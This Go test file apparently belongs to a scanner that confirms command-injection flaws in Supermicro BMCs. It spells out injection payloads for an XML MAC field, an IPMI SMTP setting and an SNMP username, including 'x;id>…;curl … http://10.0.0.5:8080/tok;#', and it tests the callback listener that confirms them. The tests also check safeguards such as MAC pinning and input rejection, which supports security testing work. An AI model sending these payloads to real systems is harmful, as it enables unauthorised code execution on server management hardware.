package ipmi

import (
	"io"
	"net/http"
	"os/exec"
	"strings"
	"testing"
	"time"
)

func TestSMCShellQuote(t *testing.T) {
	for _, value := range []string{"", "ac:1f:6b:5b:46:ce", "operator's marker", "a b;$(id)\n\"test\""} {
		t.Run(value, func(t *testing.T) {
			output, err := exec.Command("sh", "-c", "printf '%s' "+shellQuote(value)).CombinedOutput()
			if err != nil {
				t.Fatalf("quoted value failed: %v: %s", err, output)
			}
			if string(output) != value {
				t.Errorf("quoted value = %q, want %q", output, value)
			}
		})
	}
}

func TestSMCX14MACHelpers(t *testing.T) {
	for _, value := range []string{"ac:1f:6b:5b:46:ce", "AC:1F:6B:5B:46:CE"} {
		if !ValidateSMCX14MAC(value) {
			t.Errorf("valid MAC rejected: %q", value)
		}
		data := []byte(`<IPMI><Networking><MacAddr value="` + value + `"/></Networking></IPMI>`)
		parsed, err := ParseX14PSOOBBMAC(data)
		if err != nil || parsed != value {
			t.Errorf("parsed MAC = %q, %v; want %q", parsed, err, value)
		}
	}
	for _, value := range []string{"", "not-a-mac", "ac-1f-6b-5b-46-ce", "ac:1f:6b:5b:46:cg", "ac:1f:6b:5b:46:ce;id"} {
		if ValidateSMCX14MAC(value) {
			t.Errorf("invalid MAC accepted: %q", value)
		}
		data := []byte(`<IPMI><Networking><MacAddr value="` + value + `"/></Networking></IPMI>`)
		if _, err := ParseX14PSOOBBMAC(data); err == nil {
			t.Errorf("invalid backup MAC accepted: %q", value)
		}
	}
	for _, data := range []string{"<IPMI/>", `<MacAddr value="ac:1f:6b:5b:46:ce`} {
		if _, err := ParseX14PSOOBBMAC([]byte(data)); err == nil {
			t.Errorf("missing or incomplete MAC accepted: %q", data)
		}
	}
}

// httpGet issues a plain GET and drains the body, for the callback tests.
func httpGet(url string) (int, error) {
	resp, err := http.Get(url) //nolint:gosec // loopback test listener
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)
	return resp.StatusCode, nil
}

// TestSMCX14PSOOBBXMLSafetyContract verifies the CVE-2026-65213 MAC constraint: the
// payload must always echo a valid MAC back to fw_setenv, because fw_setenv does
// not validate macaddr/ethaddr and a wrong value persists in the U-Boot
// environment and can stop the BMC from booting.
func TestSMCX14PSOOBBXMLSafetyContract(t *testing.T) {
	xml, err := SMCX14PSOOBBXML(SMCX14PSOOBBPayloadOptions{
		CallbackURL: "http://10.0.0.5:8080/tok",
		MarkerPath:  "/tmp/oob_marker",
		KnownMAC:    "ac:1f:6b:5b:46:ce",
	})
	if err != nil {
		t.Fatalf("SMCX14PSOOBBXML: %v", err)
	}
	s := string(xml)
	for _, want := range []string{
		`<?xml version="1.0" encoding="UTF-8"?>`,
		"<IPMI><Networking><MacAddr value=\"",
		"M=&apos;ac:1f:6b:5b:46:ce&apos;", // the known MAC is embedded directly
		"curl -sfo /dev/null &quot;http://10.0.0.5:8080/tok&quot;",
		"id&gt;/tmp/oob_marker",
		"echo $M)", // the trailing echo keeps fw_setenv on the same MAC
		"/></Networking></IPMI>",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("payload missing %q:\n%s", want, s)
		}
	}
	// With a known MAC the on-target capture must not run: it is the fallback,
	// and its presence would mean the value is not pinned.
	if strings.Contains(s, "cat /sys/class/net/eth0/address") {
		t.Errorf("on-target capture present when a known MAC was supplied:\n%s", s)
	}
	// The attribute must be entity-escaped: tinyxml2 rejects a raw & or ".
	body := s[strings.Index(s, "<IPMI>"):]
	if leftover := stripXMLEntities(body); strings.Contains(leftover, "&") {
		t.Errorf("unescaped & in attribute body: %s", leftover)
	}
	if n := strings.Count(body, `"`); n != 2 {
		t.Errorf("unexpected raw quote count in body: %d", n)
	}
}

// stripXMLEntities removes the entities the payload builder emits, so a caller
// can assert that every remaining ampersand is a real one.
func stripXMLEntities(s string) string {
	for _, pair := range [][2]string{{"&amp;", "&"}, {"&lt;", "<"}, {"&gt;", ">"}, {"&quot;", `"`}, {"&apos;", "'"}} {
		s = strings.ReplaceAll(s, pair[0], pair[1])
	}
	return s
}

// TestSMCX14PSOOBBXMLFallsBackToCapture checks that without a known MAC the
// payload uses the on-target capture, which validates the 17-character format
// before echoing anything.
func TestSMCX14PSOOBBXMLFallsBackToCapture(t *testing.T) {
	xml, err := SMCX14PSOOBBXML(SMCX14PSOOBBPayloadOptions{
		CallbackURL: "http://10.0.0.5:8080/tok",
		KnownMAC:    "",
	})
	if err != nil {
		t.Fatalf("SMCX14PSOOBBXML: %v", err)
	}
	s := string(xml)
	if !strings.Contains(s, "cat /sys/class/net/eth0/address") {
		t.Errorf("expected the on-target capture when no MAC is known:\n%s", s)
	}
	// Inspect the unescaped command, since the XML layer entity-escapes quotes.
	cmd, err := SMCX14PSOOBBCommand(SMCX14PSOOBBPayloadOptions{CallbackURL: "http://10.0.0.5:8080/tok"})
	if err != nil {
		t.Fatal(err)
	}
	// The capture must validate $M against the 17-character format, and then
	// refuse to echo an empty or invalid value, because fw_setenv writes
	// whatever it receives into the U-Boot environment verbatim.
	if !strings.Contains(cmd, `[ ${#M} -eq 17 ]||M=`) {
		t.Errorf("the capture must validate the MAC length: %s", cmd)
	}
	if !strings.Contains(cmd, `[ -n "$M" ]||M=INVALID`) {
		t.Errorf("the capture must refuse to echo an empty value: %s", cmd)
	}
}

// TestSMCX14PSOOBBXMLRejectsUnsafeInputs locks the input validation: a callback
// URL or marker path that could break out of the generated command is refused
// before anything is built.
func TestSMCX14PSOOBBXMLRejectsUnsafeInputs(t *testing.T) {
	// No confirmation channel at all is refused: a blind injection with no
	// channel cannot be confirmed.
	if _, err := SMCX14PSOOBBXML(SMCX14PSOOBBPayloadOptions{KnownMAC: "ac:1f:6b:5b:46:ce"}); err == nil {
		t.Error("a payload with no callback and no marker must be refused")
	}
	// A callback URL carrying shell metacharacters is refused.
	for _, bad := range []string{
		"http://10.0.0.5/$(id)",
		"http://10.0.0.5/`id`",
		"http://10.0.0.5/a;id",
		"http://10.0.0.5/a b",
		"ftp://10.0.0.5/x",
		"10.0.0.5/x",
	} {
		if _, err := SMCX14PSOOBBXML(SMCX14PSOOBBPayloadOptions{CallbackURL: bad, KnownMAC: "ac:1f:6b:5b:46:ce"}); err == nil {
			t.Errorf("callback URL %q should be refused", bad)
		}
	}
	// A marker path that is not a plain absolute path is refused.
	for _, bad := range []string{"tmp/x", "/tmp/../etc/passwd", "/tmp/x;id", "/tmp/", "/tmp/x y"} {
		if _, err := SMCX14PSOOBBXML(SMCX14PSOOBBPayloadOptions{MarkerPath: bad, KnownMAC: "ac:1f:6b:5b:46:ce"}); err == nil {
			t.Errorf("marker path %q should be refused", bad)
		}
	}
}

// TestSMCX14PSOOBBXMLSizeBound checks the generated document stays under the
// bound the handler's fixed stack buffer requires.
func TestSMCX14PSOOBBXMLSizeBound(t *testing.T) {
	xml, err := SMCX14PSOOBBXML(SMCX14PSOOBBPayloadOptions{
		CallbackURL: "http://10.0.0.5:8080/tok",
		MarkerPath:  "/tmp/oob_marker",
		KnownMAC:    "ac:1f:6b:5b:46:ce",
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(xml) > SMCX14PSOOBBMaxXMLBytes {
		t.Errorf("payload is %d bytes, over the %d-byte bound", len(xml), SMCX14PSOOBBMaxXMLBytes)
	}
}

// TestSMCSMTPRequestWireFormat pins the OEMGetSetSMTPSetting request bytes
// against the advisory's reproduction.
func TestSMCSMTPRequestWireFormat(t *testing.T) {
	req, err := SMCSMTPRequest(SMCSMTPOpSet, 0x01, "x;id;#")
	if err != nil {
		t.Fatal(err)
	}
	want := []byte{0x06, 0x01, 0x01, 'x', ';', 'i', 'd', ';', '#'}
	if string(req) != string(want) {
		t.Fatalf("set request = % x, want % x", req, want)
	}
	req, err = SMCSMTPRequest(SMCSMTPOpGet, 0x01, "")
	if err != nil {
		t.Fatal(err)
	}
	if string(req) != string([]byte{0x06, 0x00, 0x01}) {
		t.Fatalf("get request = % x", req)
	}
	// An unknown field, an unknown op, and an over-long value are all refused
	// before anything goes on the wire.
	if _, err := SMCSMTPRequest(SMCSMTPOpSet, 0x09, "x"); err == nil {
		t.Error("an unknown field must be refused")
	}
	if _, err := SMCSMTPRequest(0x07, 0x01, "x"); err == nil {
		t.Error("an unknown op must be refused")
	}
	if _, err := SMCSMTPRequest(SMCSMTPOpSet, 0x03, strings.Repeat("A", 33)); err == nil {
		t.Error("an over-long value must be refused")
	}
}

// TestSMCCmdInjPayloadShape locks the payload shape: it closes the surrounding
// unquoted argument, runs the confirmation work, and comments out the rest.
func TestSMCCmdInjPayloadShape(t *testing.T) {
	p, err := SMCCmdInjPayload("/tmp/oobscan_marker", "http://10.0.0.5:8080/tok")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(p, "x;") || !strings.HasSuffix(p, ";#") {
		t.Errorf("payload %q must be x;...;# shaped", p)
	}
	for _, want := range []string{"id>/tmp/oobscan_marker", "curl -sfo /dev/null http://10.0.0.5:8080/tok"} {
		if !strings.Contains(p, want) {
			t.Errorf("payload missing %q: %s", want, p)
		}
	}
	if _, err := SMCCmdInjPayload("", ""); err == nil {
		t.Error("a payload with no confirmation channel must be refused")
	}
	if _, err := SMCCmdInjPayload("/tmp/x", "http://10.0.0.5/$(id)"); err == nil {
		t.Error("a callback URL with a metacharacter must be refused")
	}
}

// TestSMCWebSNMPFormShape locks the config_snmp form the SNMPv3 sink submits.
func TestSMCWebSNMPFormShape(t *testing.T) {
	form := string(SMCWebSNMPForm(SMCWebSNMPCredentials{
		Username: "a -X x;id;#",
		AuthPass: "authpass",
		PrivPass: "privpass",
	}))
	for _, want := range []string{
		"op=config_snmp",
		"en_snmpv3=on",
		"user_snmp=a%20-X%20x%3Bid%3B%23",
		"authprot=SHA",
		"privprot=AES",
		"authkey=authpass",
		"privkey=privpass",
		"en_snmpv3_trap=on",
	} {
		if !strings.Contains(form, want) {
			t.Errorf("form missing %q:\n%s", want, form)
		}
	}
}

// TestSMCCallbackServerConfirms checks the listener records a request and that
// the token gates what counts as a confirmation.
func TestSMCCallbackServerConfirms(t *testing.T) {
	srv, err := StartSMCCallbackServer("127.0.0.1:0", "127.0.0.1", "tok123")
	if err != nil {
		t.Fatalf("StartSMCCallbackServer: %v", err)
	}
	defer srv.Close()

	if !strings.Contains(srv.URL(), "tok123") {
		t.Errorf("URL %q must carry the token", srv.URL())
	}
	// A request on a different path is recorded but is not the confirmation.
	if _, err := httpGet(srv.BaseURL() + "/other"); err != nil {
		t.Fatalf("request: %v", err)
	}
	if _, ok := srv.Wait(200 * time.Millisecond); ok {
		t.Error("a request without the token must not count as the confirmation")
	}
	if len(srv.Activity()) != 1 {
		t.Errorf("activity = %d, want 1", len(srv.Activity()))
	}
	// A path that merely contains the token is not the token path either.
	if _, err := httpGet(srv.BaseURL() + "/nottok123"); err != nil {
		t.Fatalf("request: %v", err)
	}
	if _, ok := srv.Wait(200 * time.Millisecond); ok {
		t.Error("a path that only contains the token must not count as the confirmation")
	}
	// The token path is the confirmation.
	if _, err := httpGet(srv.URL()); err != nil {
		t.Fatalf("request: %v", err)
	}
	hit, ok := srv.Wait(2 * time.Second)
	if !ok {
		t.Fatal("the token request should have been the confirmation")
	}
	if hit.Path != srv.Path() {
		t.Errorf("hit path = %q, want %q", hit.Path, srv.Path())
	}
}

// TestSMCCallbackServerNoTokenAcceptsAny checks the dedicated-port default: with
// no token every request counts.
func TestSMCCallbackServerNoTokenAcceptsAny(t *testing.T) {
	srv, err := StartSMCCallbackServer("127.0.0.1:0", "127.0.0.1", "")
	if err != nil {
		t.Fatal(err)
	}
	defer srv.Close()
	if _, err := httpGet(srv.URL() + "/anything"); err != nil {
		t.Fatal(err)
	}
	if _, ok := srv.Wait(2 * time.Second); !ok {
		t.Error("with no token any request should confirm")
	}
}
